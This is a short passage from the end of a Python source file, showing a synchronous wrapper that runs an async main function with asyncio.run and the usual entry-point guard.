    """Synchronous wrapper for async main"""
    return asyncio.run(async_main())

if __name__ == "__main__":
    exit(main())